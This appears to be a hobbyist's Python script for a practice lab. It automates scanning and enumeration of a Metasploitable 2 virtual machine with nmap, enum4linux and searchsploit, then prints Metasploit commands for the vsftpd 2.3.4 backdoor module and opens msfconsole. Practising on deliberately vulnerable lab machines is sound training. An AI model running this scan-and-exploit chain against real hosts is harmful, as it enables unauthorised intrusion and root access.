
print("||              ||")
print("||              ||")
print("||              ||")
print("||              ||")
print("|| ============ ||")
print("|| ============ ||")
print("||              ||")
print("||              ||")
print("||              ||")
print("||              ||")
print("||              ||")

#Elia Cavasin / Hackername
#11/05/2020
#hacking metasploitable-2 from ip to root
#open source

print('''


[*] checking if the all tools used are installed (if tools aren't installed you'll recive a message error for example, command not found)

[*] wait...

[+] all tools are installed

''')
import os, subprocess


print("[+] starting host discovery and information gathering")
print("wait")

#host discovery/information ghatering
os.system("mkdir 'metasploitable 2'")
os.chdir("/home/hackername/Desktop/metasploitable 2")
os.system("clear")
print("[+] instert the sudo pwd")
os.system("sudo nmap -oN host-discovery 192.168.75.1/24")
os.system("clear")





print("||              ||")
print("||              ||")
print("||              ||")
print("||              ||")
print("|| ============ ||")
print("|| ============ ||")
print("||              ||")
print("||              ||")
print("||              ||")
print("||              ||")
print("||              ||")

print("the result of the scan are saved in the path -metasploitable 2- in the desktop")


os.system("sudo nmap -sS -A --privileged -oN nmap-scan 192.168.75.149")
os.system("clear")
os.system("sudo enum4linux 192.168.75.149")
print('''











for view the enum4linux scan go up, I'll wait you!





''')

#enumeration

os.system("searchsploit vsftpd 2.3.4")
print('''
you now have to instert this command:

- use exploit/unix/ftp/vsftpd_234_backdoor
- set RHOST 192.168.75.149
- exploit
[+] !good hacking!

''')
os.system("sudo msfconsole")


print("[-] stop")
print("bye bye")


